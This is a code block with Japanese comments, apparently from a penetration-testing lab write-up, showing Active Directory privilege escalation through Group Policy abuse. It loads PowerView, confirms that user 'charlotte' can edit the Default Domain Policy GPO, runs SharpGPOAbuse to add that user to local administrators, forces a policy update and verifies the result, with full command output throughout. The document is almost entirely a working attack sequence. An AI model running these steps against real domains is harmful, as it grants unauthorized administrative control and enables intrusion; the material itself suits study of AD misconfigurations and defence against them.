```sh
import-module .\PowerView.ps1

# GPOのId確認
C:\Users\TEMP\Documents> Get-GPO -Name "Default Domain Policy"
# DisplayName      : Default Domain Policy
# DomainName       : secura.yzx
# Owner            : SECURA\Domain Admins
# Id               : 31b2f340-016d-11d2-945f-00c04fb984f9 <- あとで使う
# GpoStatus        : AllSettingsEnabled
# Description      :
# CreationTime     : 8/5/2022 6:20:58 PM
# ModificationTime : 10/25/2022 5:39:34 PM
# UserVersion      : AD Version: 3, SysVol Version: 3
# ComputerVersion  : AD Version: 70, SysVol Version: 70
# WmiFilter        :

# 現在のユーザの対象GPOにおける権限
C:\Users\TEMP\Documents> Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte
# Trustee     : charlotte
# TrusteeType : User
# Permission  : GpoEditDeleteModifySecurity  <- 編集する権限がある
# Inherited   : False

# 現在のユーザをローカル管理者に登録
C:\Users\TEMP\Documents> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
# [+] Domain = secura.yzx
# [+] Domain Controller = dc01.secura.yzx
# [+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
# [+] SID Value of charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
# [+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
# [+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
# [+] The GPO does not specify any group memberships.
# [+] versionNumber attribute changed successfully
# [+] The version number in GPT.ini was increased successfully.
# [+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
# [+] Done!

# GPOを即時反映
gpupdate /force

# 結果確認
C:\Users\TEMP\Documents> net localgroup administrators
# Alias name     administrators
# Comment        Administrators have complete and unrestricted access to the computer/domain
# 
# Members
# 
# -------------------------------------------------------------------------------
# Administrator
# charlotte
# The command completed successfully.









```